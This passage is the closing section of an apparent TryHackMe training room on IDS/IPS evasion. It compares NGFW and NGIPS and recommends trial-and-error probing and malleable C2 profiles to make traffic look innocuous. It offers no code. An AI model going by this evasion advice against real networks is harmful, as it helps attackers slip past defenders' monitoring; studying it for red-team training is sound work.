Because a Next-GenerationÂ FirewallÂ (NGFW) provides the same functionality as anÂ IPS, it seems that the term NGNIPS is losing popularity for the sake of NGFW. You can read more about NGFW in theÂ [Red Team Firewalls](https://tryhackme.com/room/redteamfirewalls)Â room.


# Summary

---

In this room, we coveredÂ IDSÂ andÂ IPSÂ types based on installation location and detection engine. We also considered Snort 2 rules as an example of howÂ IDSÂ rules are triggered. To evade detection, one needs to gather as much information as possible about the deployed devices and experiment with different techniques. In other words, trial and error might be inevitable unless one has complete knowledge of the security devices and their configuration.

Using Command and Control (C2) frameworks provides their contribution toÂ IPSÂ evasion via controlling the shape of the traffic to make it as innocuous as it can get.Â C2Â profiles are a critical feature that one should learn to master if they use anyÂ C2Â framework that supports malleable profiles.

